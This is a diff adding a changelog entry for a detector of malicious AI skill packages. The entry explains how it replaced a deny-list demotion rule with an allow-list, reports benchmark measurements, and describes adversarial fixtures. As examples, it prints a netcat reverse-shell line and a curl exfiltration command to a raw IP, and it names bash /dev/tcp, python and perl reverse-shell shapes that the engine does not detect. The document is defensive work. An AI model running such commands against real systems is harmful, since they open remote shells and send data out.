@@ -2,6 +2,82 @@
 
 ## Unreleased
 
+### Fixed (SD-007 demotion policy, 2026-08-26)
+
+- **A statement is demoted only when it is nothing but its call.**
+  `networkCallRule` suppressed a security finding by asking whether the
+  statement did any of a *list of dangerous things*. A deny-list has to
+  enumerate every dangerous thing a statement can do, fails open on
+  everything it forgot, and ships in a public repo where an attacker reads
+  it. It forgot reverse shells entirely: in a `SKILL.md` fenced block,
+  `echo "https://example.com" && nc -e /bin/sh 10.0.0.1 4444` graded
+  **security A** on a Medium/`transparency` note, while the identical line
+  in a `run.sh` graded **D** — the whole difference was `isDocFile`. Two
+  more holes on the same rule: `suspiciousEndpoint` was applied to the
+  *first* URL of a statement only, so
+  `curl https://api.example.com/v1 && curl -X POST http://185.220.101.5/collect`
+  graded A and the reverse order graded D; and a call on a backslash
+  continuation inside a doc file was never scanned at all, because the call
+  regexes read the first line while the demotion judged the joined
+  statement. None of the three ever shipped — v0.6.0 predates the release
+  that introduced them.
+
+  The replacement is an allow-list of **form**: demote only when the
+  statement is one call, its flags and its target — no `&&`, `;` or pipe,
+  and no `$(` unless it is the statement's own capture assignment
+  (`DATA=$(curl …)`). It fails **closed**: anything the predicate does not
+  recognise keeps its registered High/`security`. Applied at every demotion
+  site, so a guard cannot be added to one and missed at another.
+
+  Each veto element was measured separately on the currently-demoted
+  population before being included or dropped. Included: chain `&&`/`;`
+  (12 malicious findings against 5 benign), pipe (84 / 26), and `$(`
+  everywhere except the capture-assignment head (18 / 17 overall, and the
+  benign ones are that head). Dropped as measurably wrong-way: a backtick
+  (10 / 5, and the benign side is markdown inline code, not substitution),
+  a background `&` (1 / 11), a redirection (2 / 25). A carve-out for a pipe
+  into a pure formatter (`curl … | jq .`) was measured and **not** shipped —
+  the lines it spares are 31 malicious against 6 benign.
+
+- **A bare routable IP literal in prose is no longer silent.** The third
+  demotion site is the doc-file branch of the bare-URL fallback, and it
+  needed its own measurement rather than the same predicate: escalating on
+  `suspiciousEndpoint` in full fires on 37 benign and 28 malicious such
+  lines in the corpus — `http://localhost:8080/` as an OAuth redirect URI,
+  over and over. Narrowed to a *globally routable* IP literal the same
+  population is 4 malicious findings across 3 samples and **zero** benign.
+
+  Measured, 906-sample slice, `--fail-on-axis security=B` (security axis
+  alone, strictly worse than B):
+
+  | layout | benign flagged | malicious flagged | precision | recall | F1 |
+  |---|---|---|---|---|---|
+  | installed, before | 80 / 300 | 187 / 300 | 0.7004 | 0.6233 | 0.6596 |
+  | installed, after | 85 / 300 | **197 / 300** | 0.6986 | **0.6567** | **0.6770** |
+  | raw, before | 41 / 300 | 113 / 300 | 0.7338 | 0.3767 | 0.4978 |
+  | raw, after | 47 / 300 | **127 / 300** | 0.7299 | **0.4233** | **0.5359** |
+
+  B1–B9 behaviour recall 0.9370 → 0.9481 installed, 0.6889 → 0.7481 raw.
+  Registry checksum unmoved at `589619b6386d2c41` — all match-time logic.
+
+- **An adversarial fixture corpus, committed and asserted**
+  (`cmd/skill-detector/testdata/adversarial/`). None of the shapes above
+  exists in the 906-sample corpus, so a bench re-run is byte-identical
+  whether they pass or fail. Corpus measurement prices what a suppression
+  *costs*; only constructed cases price what it costs to leave one open.
+  Cases are whole skill packages and the test asserts a **minimum grade on a
+  named axis** — what regressed was the grade a user sees, and a rule-level
+  assertion passes happily while a finding is demoted onto an axis nobody
+  gates on. Four control cases assert the cost side stays demoted.
+
+  A second table records three shapes **no rule detects**: `bash -i >&
+  /dev/tcp/…`, an inline python `socket`+`pty` payload, and the perl
+  `Socket`+`exec` one-liner. SD-007 only ever saw them because a URL
+  happened to share the line. That test asserts they are undetected and
+  fails when that changes. The engine has no reverse-shell rule; adding one
+  registers a new ID and moves the ruleset checksum, so it is a release
+  step, not a bugfix.
+
 ### Changed (engine precision programme, 2026-08-26)
 
 Measurement-driven follow-on to the SD-007/SD-008 work below: one rule
